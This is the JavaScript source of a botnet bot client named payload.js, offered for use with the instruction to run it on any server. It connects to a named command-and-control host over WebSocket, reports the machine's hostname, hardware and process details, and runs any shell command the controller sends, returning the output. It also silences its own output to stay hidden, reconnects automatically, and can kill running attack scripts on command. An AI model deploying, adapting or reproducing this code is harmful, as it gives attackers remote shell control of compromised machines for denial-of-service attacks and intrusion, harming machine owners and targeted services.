/**
 * payload.js — Bot client for botnet C2
 * Run this on any server:  node payload.js
 * It will connect to the controller via WebSocket and stay connected silently.
 * Auto-reconnects on disconnect. Executes received shell commands and reports results.
 */

'use strict';

const WebSocket = require('ws');
const os = require('os');
const { execSync, exec } = require('child_process');

// ─── Config ───────────────────────────────────────────────────────────────────
const CONTROLLER_URL = process.env.CONTROLLER_URL || 'wss://botnet.atlastresser.site/connect';
const RECONNECT_DELAY = 5000;   // ms to wait before reconnect
const HEARTBEAT_INTERVAL = 20000; // ms between heartbeat pings

// ─── Debug Flag ───────────────────────────────────────────────────────────────
const DEBUG = process.argv.includes('--debug');

function log(color, ...args) {
    if (!DEBUG) return;
    const colors = {
        green:  '\x1b[32m',
        red:    '\x1b[31m',
        yellow: '\x1b[33m',
        cyan:   '\x1b[36m',
        dim:    '\x1b[2m',
        reset:  '\x1b[0m'
    };
    const c = colors[color] || colors.reset;
    process.__stdout.write(`${c}${args.join(' ')}${colors.reset}\n`);
}

// Preserve real stdout before any suppression
process.__stdout = process.stdout;

// ─── Collect Bot Info ─────────────────────────────────────────────────────────
function getBotInfo() {
    const cpuList = os.cpus();
    const cpuModel = cpuList.length > 0 ? cpuList[0].model : 'unknown';
    return {
        hostname: os.hostname(),
        platform: os.platform(),   // linux, win32, darwin, etc.
        arch: os.arch(),           // x64, arm64, ia32 (x86), etc.
        cpus: cpuList.length,
        cpuModel,
        totalMem: os.totalmem(),
        freeMem: os.freemem(),
        version: process.version,
        pid: process.pid,
        uptime: os.uptime()
    };
}

// ─── Execute Shell Command ────────────────────────────────────────────────────
function runCmd(cmd, callback) {
    // Increase maxBuffer and remove timeout for long-running attacks
    exec(cmd, { maxBuffer: 1024 * 1024 }, (err, stdout, stderr) => {
        callback({
            cmd,
            stdout: stdout?.toString().trim() || '',
            stderr: stderr?.toString().trim() || '',
            error: err ? err.message : null,
            exitCode: err ? (err.code || 1) : 0
        });
    });
}

// ─── Main Bot Logic ───────────────────────────────────────────────────────────
let ws = null;
let botId = null;
let heartbeatTimer = null;
let reconnectTimer = null;
let isConnecting = false;

function clearTimers() {
    if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
    if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
}

function scheduleReconnect() {
    clearTimers();
    reconnectTimer = setTimeout(() => {
        connect();
    }, RECONNECT_DELAY);
}

function startHeartbeat(socket) {
    if (heartbeatTimer) clearInterval(heartbeatTimer);
    heartbeatTimer = setInterval(() => {
        if (socket.readyState === WebSocket.OPEN) {
            socket.send(JSON.stringify({ type: 'heartbeat', botId }));
        }
    }, HEARTBEAT_INTERVAL);
}

function sendInfo(socket) {
    socket.send(JSON.stringify({
        type: 'info',
        botId,
        data: getBotInfo()
    }));
}

function connect() {
    if (isConnecting) return;
    isConnecting = true;
    log('dim', `[~] connecting to ${CONTROLLER_URL} ...`);

    try {
        ws = new WebSocket(CONTROLLER_URL, {
            handshakeTimeout: 10000,
            rejectUnauthorized: false  // allow self-signed certs on Replit
        });
    } catch (e) {
        log('red', `[✗] ws init error → ${e.message}`);
        isConnecting = false;
        scheduleReconnect();
        return;
    }

    ws.on('open', () => {
        isConnecting = false;
        log('green', '[+] connected to controller — waiting for handshake...');
    });

    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());

            switch (msg.type) {
                // Server assigns us an ID after connection
                case 'handshake':
                    botId = msg.botId;
                    log('green', `[✓] handshake ok — botId: ${botId}`);
                    sendInfo(ws);
                    startHeartbeat(ws);
                    break;

                // Server keeps bot alive
                case 'pong':
                    log('dim', '[♥] pong received');
                    break;

                // Execute shell command
                case 'cmd':
                    if (msg.cmd === 'shell' && msg.args !== undefined) {
                        log('cyan', `[»] cmd received → ${msg.args}`);
                        runCmd(msg.args, (result) => {
                            log('cyan', `[«] result → exit:${result.exitCode} | ${result.stdout.slice(0, 80)}`);
                            if (ws && ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({ type: 'result', botId, data: result }));
                            }
                        });
                    }

                    // Stop running attack — pkill/taskkill script by name
                    if (msg.cmd === 'stopshell' && msg.args) {
                        const scriptName = msg.args;   // e.g. kalimasada.js
                        const isWin = os.platform() === 'win32';
                        // On Windows use wmic for robust command line matching
                        const killCmd = isWin 
                            ? `wmic process where "commandline like '%%${scriptName}%%'" delete`
                            : `pkill -f "${scriptName}"`;
                            
                        log('yellow', `[✕] stopshell → killing: ${scriptName}`);
                        runCmd(killCmd, (result) => {
                            log('yellow', `[✕] killed exit:${result.exitCode}`);
                            if (ws && ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({ type: 'result', botId, data: { ...result, cmd: 'stopshell' } }));
                            }
                        });
                    }
                    break;

                // Kill / terminate bot process
                case 'kill':
                    log('red', '[!] kill signal received — exiting...');
                    ws.close();
                    process.exit(0);
                    break;

                // Update info on demand
                case 'getinfo':
                    log('dim', '[i] getinfo requested — sending...');
                    sendInfo(ws);
                    break;

                default:
                    break;
            }
        } catch (_) {}
    });

    ws.on('close', () => {
        isConnecting = false;
        clearTimers();
        log('yellow', `[-] disconnected — reconnecting in ${RECONNECT_DELAY / 1000}s...`);
        scheduleReconnect();
    });

    ws.on('error', (err) => {
        isConnecting = false;
        clearTimers();
        log('red', `[✗] ws error → ${err.message}`);
        try { ws.terminate(); } catch (_) {}
        scheduleReconnect();
    });
}

// ─── Suppress output when NOT in debug mode ─────────────────────────────────
if (!DEBUG) {
    process.stdout.write = () => {};
    process.stderr.write = () => {};
    console.log = console.warn = console.error = () => {};
} else {
    const bold = '\x1b[1m';
    const rs   = '\x1b[0m';
    process.__stdout.write(`\n  ${bold}\x1b[35m[payload.js]\x1b[0m debug mode enabled\n\n`);
}

// ─── Start ────────────────────────────────────────────────────────────────────
connect();
